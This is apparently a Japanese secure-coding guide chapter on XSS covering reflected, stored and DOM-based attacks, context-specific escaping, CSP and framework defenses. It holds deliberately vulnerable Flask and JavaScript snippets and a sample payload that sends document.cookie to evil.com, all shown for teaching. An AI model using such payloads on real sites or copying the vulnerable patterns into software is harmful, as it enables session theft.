# XSS対策

> Reflected、Stored、DOM-based XSSの各攻撃手法を理解し、エスケープ、CSP、サニタイゼーションによる多層防御を実装する。

## この章で学ぶこと

1. **3種類のXSS**（Reflected/Stored/DOM-based）の攻撃メカニズムと違いを理解する
2. **コンテキスト別エスケープ**とサニタイゼーションの正しい実装方法を習得する
3. **Content Security Policy（CSP）**による効果的な防御戦略を身につける

---

## 1. XSS（Cross-Site Scripting）とは

XSSは、攻撃者が悪意のあるスクリプトをWebページに挿入し、他のユーザーのブラウザ上で実行させる攻撃である。

```
XSS攻撃の基本フロー:

  攻撃者                    Webサーバー                 被害者
    |                          |                        |
    |-- 悪意のあるスクリプト -->|                        |
    |   を注入                 |                        |
    |                          |-- スクリプト入りの  --> |
    |                          |   ページを配信         |
    |                          |                        |-- ブラウザで
    |                          |                        |   スクリプト実行
    |<--- Cookie/セッション ---|------------------------|
    |     情報を窃取           |                        |
```

---

## 2. XSSの3つの種類

### 2.1 Reflected XSS（反射型）

リクエストパラメータに含まれたスクリプトがレスポンスにそのまま反映される。

```python
# コード例1: Reflected XSSの脆弱なコードと対策

# 脆弱なコード
@app.route("/search")
def search_vulnerable():
    query = request.args.get("q", "")
    # ユーザー入力をそのままHTMLに埋め込む -> XSS!
    return f"<h1>検索結果: {query}</h1>"
    # /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>

# 安全なコード
from markupsafe import escape

@app.route("/search")
def search_safe():
    query = request.args.get("q", "")
    # HTMLエスケープを適用
    return f"<h1>検索結果: {escape(query)}</h1>"
    # <script> -> &lt;script&gt; に変換される

# さらに安全: テンプレートエンジンの自動エスケープ
from flask import render_template

@app.route("/search")
def search_best():
    query = request.args.get("q", "")
    # Jinja2はデフォルトで自動エスケープ
    return render_template("search.html", query=query)
```

### 2.2 Stored XSS（格納型）

悪意のあるスクリプトがデータベース等に保存され、他のユーザーがアクセスした際に実行される。最も危険なXSSタイプ。

```python
# コード例2: Stored XSSの脆弱なコードと対策

# 脆弱なコード: コメント投稿
@app.route("/comments", methods=["POST"])
def post_comment_vulnerable():
    comment = request.form["comment"]
    # そのまま保存 -> 表示時にXSSが発生
    db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))
    return redirect("/comments")

# 安全なコード: サニタイゼーション + エスケープ
import bleach

ALLOWED_TAGS = ["b", "i", "u", "a", "p", "br"]
ALLOWED_ATTRS = {"a": ["href", "title"]}

@app.route("/comments", methods=["POST"])
def post_comment_safe():
    comment = request.form["comment"]
    # HTMLサニタイゼーション: 許可されたタグ以外を除去
    clean_comment = bleach.clean(
        comment,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True,
    )
    db.execute("INSERT INTO comments (body) VALUES (?)", (clean_comment,))
    return redirect("/comments")
```

### 2.3 DOM-based XSS

サーバーを経由せず、クライアントサイドのJavaScriptがDOMを安全でない方法で操作することで発生する。

```javascript
// コード例3: DOM-based XSSの脆弱なコードと対策

// 脆弱なコード
// URLが: /page#<img src=x onerror=alert(1)> の場合にXSSが発生
const hash = location.hash.substring(1);
document.getElementById("content").innerHTML = hash; // 危険!

// 安全なコード: textContentを使用
const hash = location.hash.substring(1);
document.getElementById("content").textContent = hash; // HTMLとして解釈されない

// 安全なコード: DOMPurifyでサニタイズ
import DOMPurify from "dompurify";

const hash = location.hash.substring(1);
const clean = DOMPurify.sanitize(hash);
document.getElementById("content").innerHTML = clean;
```

### XSSタイプ比較表

| 種類 | 保存場所 | 攻撃経路 | 影響範囲 | 検出難度 |
|------|---------|---------|---------|---------|
| Reflected | なし（レスポンスに反映） | URL/フォーム | リンクを踏んだユーザー | 中 |
| Stored | DB/ファイル | アプリケーション内 | ページにアクセスした全ユーザー | 低 |
| DOM-based | なし（クライアント側） | URL Fragment等 | リンクを踏んだユーザー | 高 |

---

## 3. コンテキスト別エスケープ

XSSを防ぐには、データを出力する**コンテキスト**に応じた適切なエスケープが必要である。

```
出力コンテキストとエスケープ方法:

  +------------------+------------------------------+
  | HTMLボディ        | &lt; &gt; &amp; &quot; &#x27;|
  +------------------+------------------------------+
  | HTML属性          | HTML属性エスケープ            |
  +------------------+------------------------------+
  | JavaScript       | JavaScriptエスケープ (\xHH)   |
  +------------------+------------------------------+
  | URL              | URLエンコード (%HH)           |
  +------------------+------------------------------+
  | CSS              | CSSエスケープ (\HHHHHH)       |
  +------------------+------------------------------+
```

```python
# コード例4: コンテキスト別エスケープの実装
import html
import json
from urllib.parse import quote

class XSSEncoder:
    """コンテキスト別のエスケープ処理"""

    @staticmethod
    def html_encode(s: str) -> str:
        """HTMLコンテキスト用エスケープ"""
        return html.escape(s, quote=True)

    @staticmethod
    def js_encode(s: str) -> str:
        """JavaScriptコンテキスト用エスケープ"""
        # JSON.dumpsで安全な文字列リテラルを生成
        return json.dumps(s)

    @staticmethod
    def url_encode(s: str) -> str:
        """URLコンテキスト用エスケープ"""
        return quote(s, safe="")

    @staticmethod
    def attr_encode(s: str) -> str:
        """HTML属性用エスケープ"""
        result = []
        for ch in s:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"&#x{ord(ch):02x};")
        return "".join(result)

encoder = XSSEncoder()

# 使用例
user_input = '<script>alert("XSS")</script>'

# HTMLコンテキスト
safe_html = f"<p>{encoder.html_encode(user_input)}</p>"
# => <p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>

# JavaScriptコンテキスト
safe_js = f"var name = {encoder.js_encode(user_input)};"
# => var name = "<script>alert(\"XSS\")<\/script>";

# URLコンテキスト
safe_url = f"/search?q={encoder.url_encode(user_input)}"
# => /search?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
```

---

## 4. Content Security Policy（CSP）

CSPは、ブラウザにスクリプトやリソースの読み込み元を制限させるセキュリティヘッダーである。

```
CSPの動作原理:

  サーバー                           ブラウザ
    |                                  |
    |-- CSPヘッダー付きレスポンス -->   |
    |   Content-Security-Policy:       |
    |   script-src 'self'              |
    |                                  |
    |                                  |-- 自サイトの.jsファイル
    |                                  |   => 実行許可 ✓
    |                                  |
    |                                  |-- <script>alert(1)</script>
    |                                  |   => ブロック ✗ (インラインスクリプト)
    |                                  |
    |                                  |-- <script src="evil.com/x.js">
    |                                  |   => ブロック ✗ (外部ドメイン)
```

```python
# コード例5: CSPの段階的導入
class CSPBuilder:
    """Content Security Policyの構築ヘルパー"""

    def __init__(self):
        self.directives = {}

    def add_directive(self, directive: str, *sources: str) -> 'CSPBuilder':
        self.directives.setdefault(directive, []).extend(sources)
        return self

    def build(self) -> str:
        parts = []
        for directive, sources in self.directives.items():
            parts.append(f"{directive} {' '.join(sources)}")
        return "; ".join(parts)

    def build_report_only(self) -> dict:
        """レポートオンリーモード（まず監視から開始）"""
        return {
            "Content-Security-Policy-Report-Only": self.build()
        }

    def build_enforced(self) -> dict:
        """強制モード"""
        return {
            "Content-Security-Policy": self.build()
        }

# 段階的CSP導入
# Step 1: レポートオンリーで影響を確認
csp_step1 = (CSPBuilder()
    .add_directive("default-src", "'self'")
    .add_directive("script-src", "'self'", "'unsafe-inline'")  # 一時的に許可
    .add_directive("style-src", "'self'", "'unsafe-inline'")
    .add_directive("report-uri", "/csp-report")
)

# Step 2: インラインスクリプトをnonce化
csp_step2 = (CSPBuilder()
    .add_directive("default-src", "'self'")
    .add_directive("script-src", "'self'", "'nonce-{random}'")
    .add_directive("style-src", "'self'", "'nonce-{random}'")
    .add_directive("img-src", "'self'", "data:", "https:")
    .add_directive("connect-src", "'self'", "https://api.example.com")
    .add_directive("frame-ancestors", "'none'")
    .add_directive("report-uri", "/csp-report")
)

# Step 3: 最も厳格なCSP
csp_strict = (CSPBuilder()
    .add_directive("default-src", "'none'")
    .add_directive("script-src", "'self'", "'strict-dynamic'",
                   "'nonce-{random}'")
    .add_directive("style-src", "'self'", "'nonce-{random}'")
    .add_directive("img-src", "'self'")
    .add_directive("font-src", "'self'")
    .add_directive("connect-src", "'self'")
    .add_directive("frame-ancestors", "'none'")
    .add_directive("base-uri", "'self'")
    .add_directive("form-action", "'self'")
)
```

---

## 5. フレームワーク別の組み込み対策

| フレームワーク | 自動エスケープ | CSP対応 | 備考 |
|---------------|:----------:|:------:|------|
| React | `{}` で自動エスケープ | Helmet | `dangerouslySetInnerHTML` に注意 |
| Angular | デフォルトでサニタイズ | 組み込み | `bypassSecurityTrust*` に注意 |
| Vue.js | `{{ }}` で自動エスケープ | 手動 | `v-html` に注意 |
| Django | テンプレートで自動エスケープ | middleware | `|safe` フィルタに注意 |
| Flask/Jinja2 | 自動エスケープ（有効時） | 手動 | `|safe` フィルタに注意 |

```javascript
// コード例6: React での安全なレンダリング
import DOMPurify from "dompurify";

// 安全: JSXは自動でエスケープ
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>; // HTMLとして解釈されない
}

// 危険: dangerouslySetInnerHTMLは避ける
function DangerousComponent({ htmlContent }) {
  // どうしても必要な場合はDOMPurifyでサニタイズ
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
    ALLOWED_ATTR: ["href", "title"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## アンチパターン

### アンチパターン1: ブラックリスト方式のフィルタリング

`<script>` タグだけをフィルタするアプローチ。XSSのバイパス手法は無数に存在するため、ブラックリストでは防ぎきれない。ホワイトリスト方式（許可するタグ・属性を限定）を採用すべきである。

### アンチパターン2: クライアントサイドのみの対策

JavaScriptでの入力検証だけに頼るパターン。攻撃者はブラウザを経由せずAPIに直接リクエストを送信できるため、サーバーサイドでの検証が必須である。

---

## FAQ

### Q1: 自動エスケープがあるフレームワークでもXSSは発生しますか?

発生する。`dangerouslySetInnerHTML`（React）、`v-html`（Vue）、`|safe`（Django/Jinja2）など、自動エスケープをバイパスする機能を使う場合にXSSが発生する。これらの使用は最小限にし、使用する場合はDOMPurify等でサニタイズする。

### Q2: CSPだけでXSSを完全に防げますか?

CSPだけでは不十分。CSPはXSSの影響を軽減する強力なツールだが、DOM-based XSSの一部やCSPバイパス手法も存在する。入力検証、出力エスケープ、CSPの多層防御が必要である。

### Q3: HttpOnly CookieはXSSに対して万全ですか?

HttpOnlyはJavaScriptからのCookieアクセスを防ぐが、XSS自体を防ぐものではない。XSSが成功すれば、APIリクエストの送信やページ内容の改ざんなど、Cookie窃取以外の攻撃が可能である。

---

## まとめ

| 対策 | 効果 | 適用タイミング |
|------|------|---------------|
| 自動エスケープ | 出力時のHTMLインジェクション防止 | テンプレートレンダリング |
| サニタイゼーション | 許可されたHTMLのみ通過 | ユーザー生成コンテンツの保存時 |
| CSP | インラインスクリプトの実行防止 | HTTPレスポンスヘッダー |
| HttpOnly Cookie | Cookie窃取の防止 | Cookie設定 |
| コンテキスト別エスケープ | 各出力先での安全な表示 | 全出力処理 |

---

## 次に読むべきガイド

- [02-csrf-clickjacking.md](./02-csrf-clickjacking.md) -- CSRF/クリックジャッキング対策
- [03-injection.md](./03-injection.md) -- インジェクション攻撃全般
- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- セキュアコーディング全般

---

## 参考文献

1. OWASP XSS Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. MDN Web Docs: Content Security Policy -- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
3. DOMPurify -- https://github.com/cure53/DOMPurify
4. Google CSP Evaluator -- https://csp-evaluator.withgoogle.com/
